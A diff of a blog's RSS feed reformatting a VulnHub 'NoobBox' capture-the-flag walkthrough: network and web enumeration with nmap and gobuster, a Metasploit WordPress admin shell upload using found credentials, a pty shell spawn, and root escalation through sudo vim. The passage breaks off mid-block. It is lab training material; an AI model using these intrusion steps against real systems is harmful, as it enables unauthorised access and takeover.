@@ -14,44 +14,98 @@
       
       <guid>/posts/vulnhub/noobbox/</guid>
       <description>NoobBox Vulnhub Link
-Discover User netdiscover to scan the local network for machine
-netdiscover -i eth0 ![/static/img/vulnhub/noobbox/Pasted image 20211004231834.png]
- netdiscover is used to inspect your network&amp;rsquo;s ARP traffic, or find network addresses using auto scan mode, which will scan for common local networks. -i flag is used to specify the network interface, in this case eth0. Found IP of NoobBox: 192.168.1.9  Enumeration Nmap  Scan using nmap to discover open ports and services on the machine  nmap -sC -sV -v -oN common-ports.</description>
+1. Discover  Use netdiscover to scan the local network for machine
+bashnetdiscovernetdiscover -i eth0 netdiscover is used to inspect your network&amp;rsquo;s ARP traffic, or find network addresses using auto scan mode, which will scan for common local networks. -i flag is used to specify the network interface, in this case eth0. Found IP of NoobBox: 192.168.1.9  2. Enumeration  2.</description>
       <content>&lt;h1 id=&#34;noobbox&#34;&gt;NoobBox&lt;/h1&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.vulnhub.com/entry/noobbox-1,664/&#34;&gt;Vulnhub Link&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&#34;discover&#34;&gt;Discover&lt;/h2&gt;
-&lt;p&gt;User netdiscover to scan the local network for machine&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;netdiscover -i eth0
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![/static/img/vulnhub/noobbox/Pasted image 20211004231834.png]&lt;/p&gt;
+&lt;h2 id=&#34;1-discover&#34;&gt;1. Discover&lt;/h2&gt;
+&lt;hr&gt;
+&lt;p&gt;Use netdiscover to scan the local network for machine&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;1&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;netdiscover&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+netdiscover -i eth0
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+
+  &lt;img src=&#34;/img/vulnhub/noobbox/Pasted%20image%2020211004231834.png&#34;  alt=&#34;Netdiscover&#34;  class=&#34;left&#34;  style=&#34;border-radius: 0px;&#34;  /&gt;
+
+
 &lt;ul&gt;
 &lt;li&gt;netdiscover is used to inspect your network&amp;rsquo;s ARP traffic, or find network addresses using auto scan mode, which will scan for common local networks.&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;-i&lt;/code&gt; flag is used to specify the network interface, in this case eth0.&lt;/li&gt;
 &lt;li&gt;Found IP of NoobBox: &lt;code&gt;192.168.1.9&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
-&lt;h3 id=&#34;nmap&#34;&gt;Nmap&lt;/h3&gt;
+&lt;h2 id=&#34;2-enumeration&#34;&gt;2. Enumeration&lt;/h2&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;21-nmap&#34;&gt;2.1 Nmap&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;Scan using nmap to discover open ports and services on the machine&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nmap -sC -sV -v -oN common-ports.nmap 192.168.1.9
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;!-- raw HTML omitted --&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;2&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;nmap&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+nmap -sC -sV -v -oN common-ports.nmap 192.168.1.9
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;ul&gt;
 &lt;li&gt;&lt;code&gt;-sC&lt;/code&gt; flag is used to run default nmap scripts&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;-sV&lt;/code&gt; flag is used to enumerate service versions&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;-v&lt;/code&gt; flag is used for verbose output&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;-oN&lt;/code&gt; flag is used to output the result in nmap format to a file, in this file is named common-ports.nmap.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;Result&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap 7.92 scan initiated Mon Oct  4 22:07:03 2021 as: nmap -sC -sV -v -oN common-ports.nmap 192.168.1.9&lt;/span&gt;
-Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.1.9
-Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.035s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
-Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;999&lt;/span&gt; closed tcp ports &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;conn-refused&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;!-- raw HTML omitted --&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;3&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;3&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;nmap results&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+
+# Nmap 7.92 scan initiated Mon Oct  4 22:07:03 2021 as: nmap -sC -sV -v -oN common-ports.nmap 192.168.1.9
+Nmap scan report for 192.168.1.9
+Host is up (0.035s latency).
+Not shown: 999 closed tcp ports (conn-refused)
 PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.38 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
 |_http-title: Apache2 Debian Default Page: It works
 | http-methods: 
 |_  Supported Methods: OPTIONS HEAD GET POST
-|_http-server-header: Apache/2.4.38 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;enumerate-the-website&#34;&gt;Enumerate the Website&lt;/h3&gt;
+|_http-server-header: Apache/2.4.38 (Debian)
+
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;h3 id=&#34;22-enumerate-the-website&#34;&gt;2.2 Enumerate the Website&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;Open the site on the browser, we get the default Apache webserver page
@@ -61,67 +115,141 @@ PORT   STATE SERVICE VERSION
 &lt;p&gt;We can run gobuster to enumerate the website further for directories.&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gobuster dir -u http://192.168.1.9 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o initial.gobuster
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Pasted image 20211004233655.png]]&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;!-- raw HTML omitted --&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;4&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;4&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;gobuster&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+
+gobuster dir -u http://192.168.1.9 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o initial.gobuster
+
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;!-- raw HTML omitted --&gt;
+
+  &lt;img src=&#34;/img/vulnhub/noobbox/Pasted%20image%2020211004233655.png&#34;  alt=&#34;gobuster1&#34;  class=&#34;left&#34;  style=&#34;border-radius: 0px;&#34;  /&gt;
+
+
 &lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;We can see that &lt;em&gt;&lt;strong&gt;/wordpress&lt;/strong&gt;&lt;/em&gt; is accessible.&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;On navigating to the wordpress page, we see that the site is borked due to incorrect url mapping as shown below.
-![[Pasted image 20211004234031.png]]&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;On the page source we can see the borked urls as highlighted. The mentioned IP is not reachable from our end as it doesn&amp;rsquo;t exist.
-![[Pasted image 20211004234140.png]]&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;We see that in the wordpress page, there is a post, on navigating to the post, we are redirected to the unreachable url.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;We can edit the url to point to our machine ip to access page.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;In the page, we can see the post is created by &amp;ldquo;noobbox&amp;rdquo; user. This could be a username that we can try to access.
-![[Pasted image 20211004234845.png]]&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Possible user found: &lt;code&gt;noobbox&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;On navigating to the wordpress page, we see that the site is borked due to incorrect url mapping as shown below.&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;h3 id=&#34;further-enumeration&#34;&gt;Further Enumeration&lt;/h3&gt;
+&lt;!-- raw HTML omitted --&gt;
+
+  &lt;img src=&#34;/img/vulnhub/noobbox/Pasted%20image%2020211004234031.png&#34;  alt=&#34;wppage&#34;  class=&#34;left&#34;  style=&#34;border-radius: 0px;&#34;  /&gt;
+
+
+&lt;ul&gt;
+&lt;li&gt;On the page source we can see the borked urls as highlighted. The mentioned IP is not reachable from our end as it doesn&amp;rsquo;t exist.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!-- raw HTML omitted --&gt;
+
+  &lt;img src=&#34;/img/vulnhub/noobbox/Pasted%20image%2020211004234140.png&#34;  alt=&#34;wp page source&#34;  class=&#34;left&#34;  style=&#34;border-radius: 0px;&#34;  /&gt;
+
+
+&lt;ul&gt;
+&lt;li&gt;We see that in the wordpress page, there is a post, on navigating to the post, we are redirected to the unreachable url.&lt;/li&gt;
+&lt;li&gt;We can edit the url to point to our machine ip to access page.&lt;/li&gt;
+&lt;li&gt;In the page, we can see the post is created by &amp;ldquo;noobbox&amp;rdquo; user. This could be a username that we can try to access.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!-- raw HTML omitted --&gt;
+
+  &lt;img src=&#34;/img/vulnhub/noobbox/Pasted%20image%2020211004234845.png&#34;  alt=&#34;wp page user found&#34;  class=&#34;left&#34;  style=&#34;border-radius: 0px;&#34;  /&gt;
+
+
+&lt;ul&gt;
+&lt;li&gt;Possible user found: &lt;code&gt;noobbox&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;23-further-enumeration&#34;&gt;2.3 Further Enumeration&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;We can use gobuster again on the wordpress page to further enumerate the wordpress site with file extensions&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gobuster dir -u http://192.168.1.9/wordpress -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o wordpress.gobuster -x php,html,png,jpg,jpeg
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;We do not find anything useful here, we continue with enumeration.
-![[Pasted image 20211004235238.png]]&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Next, we emumerate the base apache site for files using gobuster with file extensions&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gobuster dir -u http://192.168.1.9 -w /usr/share/wordlists/dirb/common.txt -x php,html,png,jpg,jpeg -o files.gobuster
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Pasted image 20211004235637.png]]&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;!-- raw HTML omitted --&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;5&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;5&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;gobuster wordpress site&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+
+gobuster dir -u http://192.168.1.9/wordpress -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o wordpress.gobuster -x php,html,png,jpg,jpeg
+
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
 &lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;We get a lot of default apache files along with few files in the base directory with forbidden status (status code 403).&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;The files that are accessible are img.jpg and index.html (status code 200).&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;On accessing the img.jpg url, we get an image with characters, possibly a password?&amp;hellip;
-![[Pasted image 20211005000038.png]] 
-Image is blurred intentionally for the writeup purpose.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Possible credentials - &lt;code&gt;noobbox:[Redacted]&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
+&lt;li&gt;We do not find anything useful here, we continue with enumeration.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h2 id=&#34;gaining-access&#34;&gt;Gaining Access&lt;/h2&gt;
+&lt;!-- raw HTML omitted --&gt;
+
+  &lt;img src=&#34;/img/vulnhub/noobbox/Pasted%20image%2020211004235238.png&#34;  alt=&#34;gobuster2&#34;  class=&#34;left&#34;  style=&#34;border-radius: 0px;&#34;  /&gt;
+
+
+&lt;ul&gt;
+&lt;li&gt;Next, we emumerate the base apache site for files using gobuster with file extensions&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;!-- raw HTML omitted --&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;6&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;6&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;gobuster file extensions&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+
+gobuster dir -u http://192.168.1.9 -w /usr/share/wordlists/dirb/common.txt -x php,html,png,jpg,jpeg -o files.gobuster
+
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;!-- raw HTML omitted --&gt;
+
+  &lt;img src=&#34;/img/vulnhub/noobbox/Pasted%20image%2020211004235637.png&#34;  alt=&#34;gobuster3&#34;  class=&#34;left&#34;  style=&#34;border-radius: 0px;&#34;  /&gt;
+
+
+&lt;ul&gt;
+&lt;li&gt;We get a lot of default apache files along with few files in the base directory with forbidden status (status code 403).&lt;/li&gt;
+&lt;li&gt;The files that are accessible are img.jpg and index.html (status code 200).&lt;/li&gt;
+&lt;li&gt;On accessing the img.jpg url, we get an image with characters, possibly a password?&amp;hellip;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;p&gt;
+  &lt;img src=&#34;/img/vulnhub/noobbox/Pasted%20image%2020211005000038.png&#34;  alt=&#34;pwd found&#34;  class=&#34;left&#34;  style=&#34;border-radius: 0px;&#34;  /&gt;
+
+
+Image is blurred intentionally for the writeup purpose.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Possible credentials - &lt;code&gt;noobbox:[Redacted]&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;3-gaining-access&#34;&gt;3. Gaining Access&lt;/h2&gt;
+&lt;hr&gt;
 &lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;We cannot ssh into the box with the found credentials since ssh port is closed.&lt;/p&gt;
@@ -133,42 +261,195 @@ Image is blurred intentionally for the writeup purpose.&lt;/p&gt;
 &lt;p&gt;Fire up metaspolit with &lt;code&gt;msfconsole&lt;/code&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;Search for wordpress shell upload&lt;/p&gt;
+&lt;p&gt;Search for wordpress shell upload &lt;code&gt;search wp_admin&lt;/code&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;search wp_admin
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Pasted image 20211005001506.png]]&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;use &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#To use the module&lt;/span&gt;
-show options &lt;span style=&#34;color:#75715e&#34;&gt;#To show the options that need to set (Required options)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Pasted image 20211005001819.png]]&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;!-- raw HTML omitted --&gt;
+
+  &lt;img src=&#34;/img/vulnhub/noobbox/Pasted%20image%2020211005001506.png&#34;  alt=&#34;msfconsole1&#34;  class=&#34;left&#34;  style=&#34;border-radius: 0px;&#34;  /&gt;
+
+
+&lt;!-- raw HTML omitted --&gt;
+&lt;!-- raw HTML omitted --&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;12&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;12&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;msfconsole&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+
+use 0 #To use the module
+show options #To show the options that need to set (Required options)
+
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;!-- raw HTML omitted --&gt;
+
+  &lt;img src=&#34;/img/vulnhub/noobbox/Pasted%20image%2020211005001819.png&#34;  alt=&#34;msfconsole2&#34;  class=&#34;left&#34;  style=&#34;border-radius: 0px;&#34;  /&gt;
+
+
 &lt;ul&gt;
 &lt;li&gt;We need to set the RHOSTS, TARGETURI, Username &amp;amp; Password&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;set RHOSTS 192.168.1.9
+&lt;!-- raw HTML omitted --&gt;
+&lt;!-- raw HTML omitted --&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;7&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;7&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;msfconsole exploit&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+
+set RHOSTS 192.168.1.9
 set TARGET /wordpress/
 set USERNAME noobbox
-set PASSWORD &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Redacted&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#Password redacted for writeup purpose.&lt;/span&gt;
-run &lt;span style=&#34;color:#75715e&#34;&gt;#To run the exploit&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+set PASSWORD [Redacted] #Password redacted for writeup purpose.
+run #To run the exploit
+
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;ul&gt;
 &lt;li&gt;Once get the meterpreter shell, we can switch to a tty shell if preferred and get the user flag.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;!-- raw HTML omitted --&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;8&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;8&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;meterpreter shell&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+
+python -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;
 ls -la
-cat user.txt &lt;span style=&#34;color:#75715e&#34;&gt;# Read permission for all users&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Pasted image 20211005211559.png]]&lt;/p&gt;
-&lt;h2 id=&#34;priviledge-escalation&#34;&gt;Priviledge Escalation&lt;/h2&gt;
+cat user.txt # Read permission for all users
+
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;!-- raw HTML omitted --&gt;
+
+  &lt;img src=&#34;/img/vulnhub/noobbox/Pasted%20image%2020211005211559.png&#34;  alt=&#34;user flag&#34;  class=&#34;left&#34;  style=&#34;border-radius: 0px;&#34;  /&gt;
+
+
+&lt;h2 id=&#34;4-priviledge-escalation&#34;&gt;4. Priviledge Escalation&lt;/h2&gt;
+&lt;hr&gt;
 &lt;ul&gt;
 &lt;li&gt;We can use sudo command to check if we can run any binaries&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo -l
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;!-- raw HTML omitted --&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;9&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;9&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;sudo&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+sudo -l
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;ul&gt;
 &lt;li&gt;We see that we can run vim application as a root user.&lt;/li&gt;
 &lt;li&gt;We can check GTFObins for vim privesc routes&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo vim -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:!/bin/bash&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#Get the root shell after providing noobbox&amp;#39;s pwd.&lt;/span&gt;
-whoami &lt;span style=&#34;color:#75715e&#34;&gt;#root&lt;/span&gt;
-cat /root.txt &lt;span style=&#34;color:#75715e&#34;&gt;# get the root flag&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Pasted image 20211005212725.png]]&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;!-- raw HTML omitted --&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;10&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;10&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;root shell&lt;/span&gt;
